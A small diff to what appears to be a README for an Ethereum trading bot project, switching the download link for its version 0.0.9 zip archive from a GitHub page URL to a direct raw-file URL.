@@ -5,7 +5,7 @@
 
 Latest Version: 0.0.9
 
-https://github.com/FDefiAutomation/FDefi_ETH_Bot/blob/master/versions/app_0.0.9.zip
+https://github.com/FDefiAutomation/FDefi_ETH_Bot/raw/master/versions/app_0.0.9.zip
 
 ### How to install:
 
